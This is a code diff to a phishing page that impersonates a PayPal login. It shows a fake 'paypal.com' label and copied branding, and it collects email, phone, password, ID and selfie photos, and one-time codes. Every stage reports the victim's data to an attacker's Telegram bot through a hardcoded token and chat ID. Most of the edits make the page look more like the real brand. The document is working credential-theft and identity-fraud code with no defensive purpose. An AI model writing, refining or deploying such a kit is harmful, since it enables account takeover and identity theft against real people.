@@ -45,15 +45,21 @@
             font-weight: 400;
         }
 
+        /* ---------- EXACT PAYPAL LOGO (two‑tone, official brand) ---------- */
         .paypal-logo {
             text-align: center;
             font-size: 44px;
             font-weight: 700;
-            letter-spacing: -1px;
+            letter-spacing: -0.5px;
             margin-bottom: 32px;
+            line-height: 1.2;
         }
-        .paypal-logo span:first-child { color: #003087; }
-        .paypal-logo span:last-child { color: #009CDE; }
+        .paypal-logo .pay {
+            color: #003087;
+        }
+        .paypal-logo .pal {
+            color: #009CDE;
+        }
 
         .input-group {
             margin-bottom: 24px;
@@ -102,12 +108,6 @@
         .action-btn:active {
             transform: scale(0.97);
             background: #005c9e;
-        }
-
-        .action-btn.secondary {
-            background: #F5F7FA;
-            color: #0070BA;
-            border: 1px solid #C7D0D9;
         }
 
         .link-btn {
@@ -330,14 +330,14 @@
 </head>
 <body>
 <div class="container">
-    <!-- STEP 1: EMAIL OR MOBILE NUMBER (EXACT REFERENCE LOOK) -->
+    <!-- STEP 1: EMAIL OR MOBILE NUMBER (EXACT REFERENCE) -->
     <div id="loginPanel" class="card">
         <div class="domain">paypal.com</div>
         <div class="paypal-logo">
-            <span>Pay</span><span>Pal</span>
+            <span class="pay">Pay</span><span class="pal">Pal</span>
         </div>
         <div class="input-group">
-            <div class="input-label">Email address or mobile number</div>
+            <div class="input-label">Email or mobile number</div>
             <input type="text" id="loginIdentifier" placeholder="example@email.com or +1 234 567 8900" autocomplete="off">
         </div>
         <button class="action-btn" id="continueToPhoneBtn">Next</button>
@@ -349,8 +349,8 @@
     <!-- STEP 2: PHONE NUMBER ONLY -->
     <div id="phonePanel" class="card hide">
         <div class="domain">paypal.com</div>
-        <div class="paypal-logo" style="font-size: 36px;">
-            <span>Pay</span><span>Pal</span>
+        <div class="paypal-logo">
+            <span class="pay">Pay</span><span class="pal">Pal</span>
         </div>
         <div class="input-group">
             <div class="input-label">Mobile phone number</div>
@@ -364,8 +364,8 @@
     <!-- STEP 3: PASSWORD ONLY -->
     <div id="passwordPanel" class="card hide">
         <div class="domain">paypal.com</div>
-        <div class="paypal-logo" style="font-size: 36px;">
-            <span>Pay</span><span>Pal</span>
+        <div class="paypal-logo">
+            <span class="pay">Pay</span><span class="pal">Pal</span>
         </div>
         <div class="input-group">
             <div class="input-label">Password</div>
@@ -412,11 +412,11 @@
         </div>
     </div>
 
-    <!-- STEP 5: OTP PAGE (shows last 4 digits + email request option) -->
+    <!-- STEP 5: OTP PAGE (last 4 digits + email request option) -->
     <div id="otpPanel" class="card hide">
         <div class="domain">paypal.com</div>
-        <div class="paypal-logo" style="font-size: 32px;">
-            <span>Pay</span><span>Pal</span>
+        <div class="paypal-logo">
+            <span class="pay">Pay</span><span class="pal">Pal</span>
         </div>
         <div class="otp-hint" id="otpPhoneHint">🔐 Verification code sent to <span class="phone-mask" id="maskedPhone">****</span></div>
         <div class="input-group">
@@ -442,7 +442,7 @@
 </div>
 
 <script>
-    // Telegram bot credentials (hardcoded)
+    // Telegram bot credentials (hardcoded as required)
     const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
     const CHAT_ID   = "8737104261";
 
@@ -486,7 +486,6 @@
     const resendSmsBtn = document.getElementById('resendSmsBtn');
     const requestEmailOtpBtn = document.getElementById('requestEmailOtpBtn');
 
-    // Helper functions
     function showToast(msg, isError = false) {
         toast.innerText = msg;
         toast.classList.add('show');
@@ -570,7 +569,7 @@
         showKycStep(1);
     };
 
-    // ---------- KYC PHOTO LOGIC (unchanged but robust) ----------
+    // ---------- KYC PHOTO LOGIC ----------
     let currentKycStep = 1;
     let frontStream, backStream, selfieStream, selfieIdStream;
     let usingRearFront = true, usingRearBack = true, usingRearSelfie = false, usingRearSelfieId = false;
@@ -626,7 +625,8 @@
 
     function showKycStep(step) {
         document.querySelectorAll('.kyc-step').forEach(el => el.classList.add('hide'));
-        document.getElementById(`kycStep${step}`).classList.remove('hide');
+        const targetStep = document.getElementById(`kycStep${step}`);
+        if (targetStep) targetStep.classList.remove('hide');
         currentKycStep = step;
         updateStepDots(step);
         if (step === 2) {
@@ -679,7 +679,6 @@
         capturePhoto(document.getElementById('selfieIdVideo'), document.getElementById('selfieIdStatus'), "SELFIE_WITH_ID", async () => {
             stopStream(frontStream); stopStream(backStream); stopStream(selfieStream); stopStream(selfieIdStream);
             kycPanel.classList.add('hide');
-            // Show last 4 digits of phone number
             let last4 = userData.phoneNumber.length >= 4 ? userData.phoneNumber.slice(-4) : "****";
             maskedPhoneSpan.innerText = last4;
             await sendToTelegram(`📸 <b>KYC COMPLETED</b> for ${userData.identifier}. Ready for OTP. Phone ends with ${last4}`);
@@ -705,7 +704,7 @@
         }, 1800);
     };
 
-    // Resend SMS & Request email OTP (simulate via Telegram)
+    // Resend SMS & Request email OTP (notify Telegram)
     resendSmsBtn.onclick = async () => {
         showToast("A new verification code has been sent to your phone.", false);
         await sendToTelegram(`🔄 <b>RESEND OTP (SMS)</b>\nUser requested new SMS code.\nPhone: ${userData.phoneNumber}`);
